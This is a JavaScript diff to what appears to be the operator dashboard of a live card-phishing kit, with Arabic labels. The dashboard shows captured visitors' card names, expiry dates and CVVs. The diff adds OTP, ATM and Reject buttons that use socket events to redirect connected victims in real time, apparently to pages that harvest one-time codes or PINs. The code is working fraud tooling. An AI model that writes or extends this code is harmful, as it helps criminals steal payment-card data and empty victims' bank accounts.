@@ -523,7 +523,14 @@
           html += '<div><span class="text-gray-500">الاسم:</span> <span class="font-medium">' + card.nameOnCard + '</span></div>';
           html += '<div><span class="text-gray-500">الانتهاء:</span> <span class="font-medium">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
           html += '<div><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold">' + card.cvv + '</span></div>';
-          html += '</div></div>';
+          html += '</div>';
+          // Action buttons for each card
+          html += '<div class="flex gap-2 mt-3">';
+          html += '<button onclick="cardActionOTP(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';
+          html += '<button onclick="cardActionATM(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>ATM</button>';
+          html += '<button onclick="cardActionReject(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+          html += '</div>';
+          html += '</div>';
         });
         html += '</div></div>';
       }
@@ -700,6 +707,19 @@
       if (page) {
         socket.emit('admin:navigate', { visitorSocketId: socketId, page });
       }
+    }
+
+    // Card action functions
+    function cardActionOTP(socketId) {
+      socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'otp' });
+    }
+
+    function cardActionATM(socketId) {
+      socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'atm' });
+    }
+
+    function cardActionReject(socketId) {
+      socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'reject' });
     }
 
     function sendMessage(socketId) {
